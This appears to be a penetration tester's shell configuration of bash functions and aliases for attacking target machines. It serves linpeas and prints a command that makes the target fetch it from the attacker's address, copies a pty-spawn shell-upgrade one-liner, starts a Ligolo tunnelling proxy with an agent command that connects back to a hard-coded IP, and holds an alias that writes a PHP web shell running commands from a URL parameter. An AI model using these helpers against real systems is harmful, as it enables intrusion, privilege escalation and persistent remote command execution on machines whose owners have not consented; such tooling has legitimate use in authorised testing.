ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
  echo -e "[\033[96mTarget\033[0m] $(cat ~/.config/bin/target)"
}

linpeas() {
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')

  echo "Run the following command on the target machine: wget http://$ip_tun0/linpeas.sh"
  cd ~/; python3 -m http.server 80
}

upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}

set_target() {
  echo "$1" > ~/.config/bin/target && export IP=$1
}

transfer(){
  sudo python3 -m http.server 80 --directory ~/tools; echo "wget http://$ip_tun0/" | tr -d '\n' | xclip -sel clip
}

ligolo(){
  sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;cd ~/Ligolo;sudo ./proxy -selfcert; echo "./agent -connect 172.23.10.109:11601 -ignore-cert" | tr -d '\n' | xclip -sel clip 
}

alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

alias server="sudo python3 -m http.server 80"

alias target="cat ~/.config/bin/target | tr -d '\n' | xclip -sel clip"

alias phpcmd='echo "<?php system(\$_GET[\"cmd\"]); ?>" | tee webshell.php'
